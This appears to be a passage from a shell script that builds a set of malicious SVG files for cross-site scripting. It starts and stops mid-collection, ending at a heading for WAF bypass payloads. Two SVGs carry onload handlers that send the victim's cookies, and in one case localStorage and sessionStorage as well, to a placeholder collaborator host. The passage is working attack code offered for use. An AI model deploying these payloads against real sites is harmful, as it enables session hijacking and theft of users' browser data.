cat > 5-cookie-img.svg << 'EOF'
<svg onload="new Image().src='https://YOUR-COLLABORATOR.com?c='+document.cookie">
    <rect width="100" height="100" fill="yellow"/>
</svg>
EOF

# 6. All Cookies + LocalStorage
cat > 6-all-data.svg << 'EOF'
<svg onload="
    fetch('https://YOUR-COLLABORATOR.com',{
        method:'POST',
        body:JSON.stringify({
            cookies:document.cookie,
            localStorage:localStorage,
            sessionStorage:sessionStorage
        })
    })
">
    <rect width="100" height="100" fill="purple"/>
</svg>
EOF

# ============= LEVEL 3: WAF BYPASS PAYLOADS =============

